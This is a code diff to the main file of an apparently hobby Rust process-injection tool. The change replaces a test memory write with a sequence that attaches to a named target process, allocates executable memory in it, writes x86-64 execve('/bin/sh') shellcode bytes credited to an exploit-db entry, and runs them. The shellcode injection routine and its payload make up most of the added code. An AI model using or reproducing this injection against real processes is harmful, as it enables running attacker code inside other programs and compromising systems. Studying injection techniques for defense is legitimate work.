@@ -1,12 +1,9 @@
 use log::{self};
-use syscalls::Sysno;
-
 mod debugee;
 mod utils;
-
 use crate::debugee::Debugee;
 use debugee::DebugeeResult;
-use nix::libc::{MAP_ANONYMOUS, MAP_PRIVATE, PROT_READ, PROT_WRITE};
+
 fn main() -> DebugeeResult<()> {
     // Read config file
     let injector_config = utils::read_config("config");
@@ -22,24 +19,14 @@ fn main() -> DebugeeResult<()> {
     );
 
     let mut debugee = Debugee::new(injector_config.process_name);
-    debugee.attach();
-    let _mem_address = debugee
-        .syscall(
-            Sysno::mmap,
-            0,                                    // start
-            11,                                   // len
-            (PROT_READ | PROT_WRITE) as u64,      // prot
-            (MAP_PRIVATE | MAP_ANONYMOUS) as u64, // flags
-            0,                                    // fd
-            0,                                    // offset
-        )
-        .unwrap()
-        .rax;
+    debugee.attach()?;
 
-    debugee.write(_mem_address, &[1, 2, 3, 4, 5])?;
-    let mem = debugee.read(_mem_address, 11)?;
-    for a in mem {
-        log::trace!("{a}");
-    }
+    // execve("/bin/sh")
+    // https://www.exploit-db.com/exploits/46907
+    let shellcode_bytes = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
+    let mem_address = debugee.allocate_memory(shellcode_bytes.len() as u64, true)?;
+    debugee.write(mem_address, shellcode_bytes)?;
+    debugee.call_shellcode(mem_address)?;
+    debugee.detach();
     Ok(())
 }
